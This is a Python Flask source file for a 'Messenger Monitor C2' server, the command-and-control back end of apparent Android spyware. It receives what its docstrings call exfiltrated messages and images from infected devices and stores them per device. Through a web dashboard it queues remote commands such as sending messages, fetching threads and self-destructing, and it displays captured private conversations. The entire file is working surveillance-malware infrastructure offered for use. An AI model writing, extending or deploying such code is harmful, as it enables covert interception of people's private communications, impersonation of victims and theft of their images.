#!/usr/bin/env python3
"""
MessengerMonitor C2 Server
Receives exfiltrated data and provides control interface
"""

from flask import Flask, request, jsonify, render_template_string
import json
import os
import datetime
import threading

app = Flask(__name__)

# Storage
DATA_DIR = "captured_data"
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(f"{DATA_DIR}/messages", exist_ok=True)
os.makedirs(f"{DATA_DIR}/images", exist_ok=True)
os.makedirs(f"{DATA_DIR}/heartbeats", exist_ok=True)

active_devices = {}
command_queue = {}

@app.route('/ingest', methods=['POST'])
def ingest():
    """Receive exfiltrated data from the Android app"""
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    device_id = data.get('device_id', 'unknown')
    event = data.get('event', 'unknown')
    event_data = data.get('data', {})
    timestamp = data.get('timestamp', 0)
    
    # Store the data
    filename = f"{DATA_DIR}/{event}/{device_id}_{int(timestamp)}.json"
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    # Update active device
    active_devices[device_id] = {
        'last_seen': datetime.datetime.now().isoformat(),
        'event': event,
    }
    
    print(f"[+] {event.upper()} from {device_id}: {json.dumps(event_data)[:200]}")
    
    # Check if there are commands waiting for this device
    if device_id in command_queue and command_queue[device_id]:
        response = command_queue[device_id].pop(0)
        return jsonify(response)
    
    return jsonify({"status": "ok"})

@app.route('/upload', methods=['POST'])
def upload_file():
    """Receive image files"""
    device_id = request.form.get('device_id', 'unknown')
    file = request.files.get('file')
    
    if file:
        filename = f"{device_id}_{int(datetime.datetime.now().timestamp())}_{file.filename}"
        filepath = f"{DATA_DIR}/images/{filename}"
        file.save(filepath)
        print(f"[+] IMAGE received: {filepath}")
        return jsonify({"status": "ok"})
    
    return jsonify({"status": "error"}), 400

@app.route('/command/<device_id>', methods=['POST'])
def send_command(device_id):
    """Queue a command for a specific device"""
    cmd = request.json
    if device_id not in command_queue:
        command_queue[device_id] = []
    command_queue[device_id].append(cmd)
    print(f"[>] Command queued for {device_id}: {cmd}")
    return jsonify({"status": "queued"})

@app.route('/devices', methods=['GET'])
def list_devices():
    """List active monitored devices"""
    return jsonify(active_devices)

@app.route('/dashboard')
def dashboard():
    """Simple web dashboard"""
    devices = active_devices
    
    # Count messages
    msg_count = len(os.listdir(f"{DATA_DIR}/messages")) if os.path.exists(f"{DATA_DIR}/messages") else 0
    img_count = len(os.listdir(f"{DATA_DIR}/images")) if os.path.exists(f"{DATA_DIR}/images") else 0
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Messenger Monitor C2</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: monospace; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
            h1 { color: #58a6ff; }
            .card { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 10px 0; }
            .stat { display: inline-block; margin-right: 30px; }
            .stat-value { font-size: 24px; font-weight: bold; color: #58a6ff; }
            .stat-label { font-size: 12px; color: #8b949e; }
            table { width: 100%; border-collapse: collapse; }
            th, td { text-align: left; padding: 8px; border-bottom: 1px solid #30363d; }
            th { color: #8b949e; }
            .online { color: #3fb950; }
            .command-form { margin-top: 20px; }
            input, select, button { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; padding: 8px; margin: 4px; }
            button { background: #238636; cursor: pointer; }
            button:hover { background: #2ea043; }
        </style>
    </head>
    <body>
        <h1>🔍 Messenger Monitor C2</h1>
        <div class="card">
            <div class="stat"><div class="stat-value">{{ devices|length }}</div><div class="stat-label">Active Devices</div></div>
            <div class="stat"><div class="stat-value">{{ msg_count }}</div><div class="stat-label">Messages Captured</div></div>
            <div class="stat"><div class="stat-value">{{ img_count }}</div><div class="stat-label">Images Captured</div></div>
        </div>
        
        <div class="card">
            <h3>Active Devices</h3>
            <table>
                <tr><th>Device ID</th><th>Last Seen</th><th>Last Event</th><th>Actions</th></tr>
                {% for did, info in devices.items() %}
                <tr>
                    <td class="online">{{ did[:16] }}...</td>
                    <td>{{ info.last_seen }}</td>
                    <td>{{ info.event }}</td>
                    <td>
                        <form action="/command/{{ did }}" method="post" style="display:inline">
                            <input type="hidden" name="command" value="fetch_threads">
                            <button type="submit">Refresh Threads</button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>
        
        <div class="card command-form">
            <h3>Send Command to Device</h3>
            <form id="commandForm">
                <select id="deviceSelect">
                    {% for did in devices.keys() %}
                    <option value="{{ did }}">{{ did[:16] }}...</option>
                    {% endfor %}
                </select>
                <select id="commandSelect">
                    <option value="send_message">Send Message</option>
                    <option value="fetch_threads">Fetch Threads</option>
                    <option value="change_poll_interval">Change Poll Interval</option>
                    <option value="self_destruct">Self Destruct</option>
                </select>
                <input type="text" id="commandParam" placeholder="Thread ID / message text">
                <button type="submit">Execute</button>
            </form>
        </div>
        
        <div class="card">
            <h3>Recent Messages</h3>
            <table>
                <tr><th>Time</th><th>From</th><th>Content</th></tr>
                {% for msg in recent_messages %}
                <tr>
                    <td>{{ msg.time }}</td>
                    <td>{{ msg.author }}</td>
                    <td>{{ msg.text[:100] }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
        
        <script>
        document.getElementById('commandForm').onsubmit = async (e) => {
            e.preventDefault();
            const device = document.getElementById('deviceSelect').value;
            const command = document.getElementById('commandSelect').value;
            const param = document.getElementById('commandParam').value;
            
            await fetch('/command/' + device, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command, param: param})
            });
            
            alert('Command sent!');
        };
        
        // Auto-refresh every 5 seconds
        setTimeout(() => location.reload(), 5000);
        </script>
    </body>
    </html>
    """
    
    # Get recent messages
    recent = []
    msg_dir = f"{DATA_DIR}/messages"
    if os.path.exists(msg_dir):
        files = sorted(os.listdir(msg_dir), reverse=True)[:20]
        for f in files:
            try:
                with open(f"{msg_dir}/{f}") as fh:
                    data = json.load(fh)
                    recent.append({
                        'time': data.get('timestamp', ''),
                        'author': data.get('data', {}).get('author_id', ''),
                        'text': data.get('data', {}).get('text', ''),
                    })
            except:
                pass
    
    return render_template_string(html, devices=devices, msg_count=msg_count, img_count=img_count, recent_messages=recent)

if __name__ == '__main__':
    print("[*] Messenger Monitor C2 Server Starting...")
    print("[*] Dashboard: http://0.0.0.0:8080/dashboard")
    print("[*] API: http://0.0.0.0:8080/ingest")
    app.run(host='0.0.0.0', port=8080, debug=False)
